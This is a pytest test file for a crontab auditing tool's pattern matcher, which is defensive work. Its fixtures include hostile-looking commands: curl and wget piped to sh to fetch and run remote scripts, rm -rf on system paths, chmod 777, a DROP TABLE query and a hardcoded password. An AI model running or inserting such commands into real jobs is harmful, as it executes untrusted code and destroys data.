"""Tests for crontab_audit.pattern_matcher."""
import pytest

from crontab_audit.parser import CrontabEntry
from crontab_audit.pattern_matcher import (
    PatternMatch,
    match_entries,
    match_entry,
)


def make_entry(command: str, host: str = "host1") -> CrontabEntry:
    return CrontabEntry(
        host=host,
        minute="0",
        hour="1",
        dom="*",
        month="*",
        dow="*",
        command=command,
    )


def test_match_rm_rf_detected():
    entry = make_entry("rm -rf /tmp/old")
    matches = match_entry(entry)
    labels = [m.label for m in matches]
    assert "destructive" in labels


def test_match_curl_pipe_sh_detected():
    entry = make_entry("curl http://example.com/script.sh | sh")
    matches = match_entry(entry)
    labels = [m.label for m in matches]
    assert "remote-exec" in labels


def test_match_wget_pipe_sh_detected():
    entry = make_entry("wget -q -O - http://example.com/run.sh | sh")
    matches = match_entry(entry)
    labels = [m.label for m in matches]
    assert "remote-exec" in labels


def test_match_chmod_777_detected():
    entry = make_entry("/usr/bin/chmod 777 /var/www")
    matches = match_entry(entry)
    labels = [m.label for m in matches]
    assert "permission" in labels


def test_match_drop_table_detected():
    entry = make_entry("mysql -e 'drop table users'")
    matches = match_entry(entry)
    labels = [m.label for m in matches]
    assert "database" in labels


def test_match_hardcoded_secret_detected():
    entry = make_entry("deploy.sh password=hunter2")
    matches = match_entry(entry)
    labels = [m.label for m in matches]
    assert "secret" in labels


def test_safe_command_returns_no_matches():
    entry = make_entry("/usr/local/bin/backup.sh")
    matches = match_entry(entry)
    assert matches == []


def test_pattern_match_str_includes_label_and_host():
    entry = make_entry("rm -rf /data", host="webserver")
    matches = match_entry(entry)
    assert len(matches) >= 1
    result_str = str(matches[0])
    assert "destructive" in result_str
    assert "webserver" in result_str


def test_match_entries_aggregates_multiple():
    entries = [
        make_entry("rm -rf /tmp", host="a"),
        make_entry("/bin/safe.sh", host="b"),
        make_entry("curl http://x.com | sh", host="c"),
    ]
    matches = match_entries(entries)
    hosts = [m.entry.host for m in matches]
    assert "a" in hosts
    assert "b" not in hosts
    assert "c" in hosts


def test_extra_pattern_is_applied():
    extra = [{"pattern": r"\bmy_risky_cmd\b", "label": "custom", "description": "Custom rule"}]
    entry = make_entry("my_risky_cmd --all")
    matches = match_entry(entry, extra_patterns=extra)
    labels = [m.label for m in matches]
    assert "custom" in labels


def test_extra_pattern_does_not_affect_unrelated_entry():
    extra = [{"pattern": r"\bmy_risky_cmd\b", "label": "custom", "description": "Custom rule"}]
    entry = make_entry("/bin/safe.sh")
    matches = match_entry(entry, extra_patterns=extra)
    assert matches == []


def test_match_is_case_insensitive():
    entry = make_entry("RM -RF /important")
    matches = match_entry(entry)
    labels = [m.label for m in matches]
    assert "destructive" in labels
